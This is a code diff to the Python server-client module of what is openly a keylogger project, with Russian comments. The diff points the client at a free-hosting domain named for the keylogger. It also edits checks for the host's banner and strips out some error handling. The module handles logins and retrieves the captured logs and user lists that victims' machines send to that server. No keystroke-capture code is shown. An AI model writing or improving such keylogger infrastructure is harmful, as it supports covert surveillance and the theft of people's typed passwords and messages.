@@ -3,7 +3,7 @@ import json
 from tkinter.messagebox import showerror
 import re
 
-servername = "keylogger" 
+servername = "projectuniveristykeylogger.000webhostapp.com" 
 
 class c_server:
     def auth(username, password):
@@ -21,6 +21,7 @@ class c_server:
             response = requests.post(url, data=data, headers=headers)
             #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
             result = ""
+
             try:
                 result = json.loads(c_server.decryptResponse(response.content))
             except json.JSONDecodeError as e:
@@ -58,7 +59,7 @@ class c_server:
             # Парсим строку, полученную от сервера
             users_data = c_server.decryptResponse(response.content)
  
-            if "000webhost.com" in users_data: # fix for free shit hosting
+            if "000webhost.com" in response.text: # fix for free shit hosting
                 return False
             
             # Убираем перенос и разбиваем строку на отдельные имена
@@ -89,7 +90,7 @@ class c_server:
 
             decrypted_response = c_server.decryptResponse(response.content)  # Расшифровываем полученные данные
 
-            if "000webhost.com" in decrypted_response: # fix for free shit hosting
+            if "000webhost.com" in response.text: # fix for free shit hosting
                 return False
 
             logs = decrypted_response.split('\n')  # Разделить логи по символу новой строки
@@ -126,7 +127,7 @@ class c_server:
             decrypted_text_data = c_server.decryptResponse(response.content)
             decrypted_text_json_data = ""
 
-            if decrypted_text_data != "" and not "000webhost.com" in decrypted_text_data: 
+            if decrypted_text_data != "" and not "000webhost.com" in response.text: 
                 try:
                     decrypted_text_json_data = json.loads(decrypted_text_data)
                     return decrypted_text_json_data
@@ -156,7 +157,7 @@ class c_server:
             decrypted_text_data = c_server.decryptResponse(response.content)
             decrypted_text_json_data = ""
 
-            if decrypted_text_data != "" and not "000webhost.com" in decrypted_text_data: # fix for free shit hosting
+            if decrypted_text_data != "" and not "000webhost.com" in response.text: # fix for free shit hosting
                 try:
                     decrypted_text_json_data = json.loads(decrypted_text_data)
                     return decrypted_text_json_data
@@ -187,7 +188,7 @@ class c_server:
             # Парсим строку, полученную от сервера
             active_status = c_server.decryptResponse(response.content)
             
-            if "000webhost.com" in active_status: # fix for free shit hosting
+            if "000webhost.com" in response.text: # fix for free shit hosting
                 return False
 
             return active_status
@@ -213,21 +214,9 @@ class c_server:
             #response.raise_for_status()  # Raise an exception for 4xx and 5xx status codes
             result = ""
 
-            if "000webhost.com" in response.content: # fix for free shit hosting
+            if "000webhost.com" in response.text: # fix for free shit hosting
                 return False
-                
-            if response.content != "":
-                try:
-                    result = json.loads(c_server.decryptResponse(response.content))
-                except json.JSONDecodeError as e:
-                    showerror(title="Ошибка", message=f"JSON invalid result: {result}, Error: {e}")
-                    print(f"Ignoring invalid log: {result}, Error: {e}")
 
-                if "Error" in result["Status"]:
-                    error_message = result["msg"]
-                    showerror(title="Ошибка", message=f"{error_message}")
-                    print(f"Error: {error_message}")
-                    return False
             return True
         except requests.exceptions.RequestException as e:
             showerror(title="Ошибка", message=f"{e}")
